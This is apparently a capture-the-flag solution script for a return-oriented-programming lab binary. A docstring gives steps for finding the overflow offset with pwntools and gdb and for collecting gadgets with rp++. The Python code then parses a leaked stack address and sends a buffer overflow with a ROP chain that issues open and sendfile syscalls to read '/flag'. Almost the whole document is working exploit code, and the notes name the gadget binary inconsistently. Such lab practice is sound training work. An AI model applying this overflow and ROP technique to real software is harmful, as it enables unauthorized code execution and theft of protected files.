"""
check pwn with: pwn checksec <bin_file_name>

Terminal 1:
import pwn
io = pwn.process("level4_testing1")
#TODO: get <pid>

Terminal 2: 
gdb -p <pid>
c

Terminal 1:
io.send(pwn.cyclic(1000, n=8))

Terminal 2: 
#TODO: get return addr <retq>

Terminal 1: 
pwn.cyclic_find(<retq>, n=8) #prints starting position of return address

In a new terminal, run the following to get the gadgets:
rp++ -r2 -f level4_teaching1 | grep "pop rax" # rax_gadget
rp++ -r2 -f level4_teaching1 | grep "pop rdi" # rdi_gadget
rp++ -r2 -f level4_teaching1 | grep "pop rsi" # rsi_gadget
rp++ -r2 -f level4_teaching1 | grep "pop rdx" # rdx_gadget
rp++ -r2 -f level4_teaching1 | grep "syscall" # syscall_gadget
rp++ -r2 -f level4_teaching1 | grep "pop r10" # r10_gadget

Note for those with "/xf0": 
* if it is in the first position, +1.
* if it is in the second position, remove --unique flag and find another suitable address.

Run script below. Note where the numbers are from.
"""

import pwn

dis = 152

io = pwn.process("/challenges/rop/level4_testing1")

# find leak address
y = io.recv()
# wait for content to be received
leak_addr = int(y[y.find(b"LEAK"):].split()[7][:-1], 16)

payload = b"/flag" + bytes([0x0]) + b"a"*(dis-6)

rax_gadget = 0x0040184f
rdi_gadget = 0x00401836
rsi_gadget = 0x0040186e
rdx_gadget = 0x0040183e # 0x0040183d + 1
syscall_gadget = 0x0040185e
r10_gadget = 0x00401866 # rp++ -r2 -f level4_testing1 | grep "pop r10"

open_gadget = pwn.p64(rax_gadget) + pwn.p64(0x2) + pwn.p64(rdi_gadget) + pwn.p64(leak_addr) + pwn.p64(rsi_gadget) + pwn.p64(0x0) + pwn.p64(rdx_gadget) + pwn.p64(0x0) + pwn.p64(syscall_gadget)

sendfile_gadget = pwn.p64(rax_gadget) + pwn.p64(40) + pwn.p64(rdi_gadget) + pwn.p64(0x1) + pwn.p64(rsi_gadget) + pwn.p64(0x3) + pwn.p64(rdx_gadget) + pwn.p64(0x0) + pwn.p64(r10_gadget) + pwn.p64(0x1000) + pwn.p64(syscall_gadget)

payload = payload + open_gadget + sendfile_gadget

io.send(payload)

print(io.readall().decode('latin-1'))